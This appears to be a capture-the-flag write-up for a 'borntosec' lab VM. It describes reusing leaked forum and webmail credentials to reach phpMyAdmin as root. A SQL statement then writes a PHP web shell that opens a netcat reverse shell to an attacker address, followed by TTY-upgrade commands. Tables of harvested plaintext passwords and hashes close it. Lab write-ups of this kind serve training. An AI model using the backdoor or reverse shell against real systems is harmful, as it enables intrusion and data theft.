# Port 443 (HTTPS)

- `https://<IP>/forum/index.php?id=6` leak credentials to access forum as `lmezard`

- User `lmezard` use same password for `webmail` and `forum`

- User `lmezard` mail box leak credentials to access `phpmyadmin` as `root`

- Adding reverse shell backdoor via `phpmyadmin`:

```sql
SELECT '<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc <ip_addr> 4242 >/tmp/f"); ?>' INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'
```

Once connected, we can upgrade our shell into a full TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
#[CTRL+Z]
```

```bash
stty raw -echo
fg
#[ENTER]
#[ENTER]
```

Now we have a full shell as `www-data`

## Credentials found

### `https://$ip/forum`

| Login | Password |
|-|-|
| `lmezard` | [Plain] `!q\]Ej?*5K5cy*AJ` |
| `admin` | [Hex ?] `ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0516d551c28` |
| `qudevide` | [Hex ?] `a12e059d6f4c21c6c5586283c8ecb2b65618ed0a0dc1b302a2` |
| `thor` | [Hex ?] `d30668b779542d60c4cde29e7170148198b1623f4453866797` |
| `wandre` | [Hex ?] `f8562b53084d60efa4208fa50d1ef753ef18e089d2dd56c4ed` |
| `zaz` | [Hex ?] `f10b3271bf523f12ebd58ef8581c851991bf0d4b4c4bf49d7c` |

### `https://$ip/webmail`

| Login | Password |
|-|-|
| `laurie@borntosec.net` | [Plain] `!q\]Ej?*5K5cy*AJ` |

### `https://$ip/phpmyadmin`

| Login | Password |
|-|-|
| `root` | [Plain] `Fg-'kKXBj87E:aJ$` |
| `phpmyadmin` | [Plain] `Fg-'kKXBj87E:aJ$` |
| `debian-sys-maint` | [SHA-1] `52B24D4192EDDFB439C67E1F92421C4D2D4F5598` |
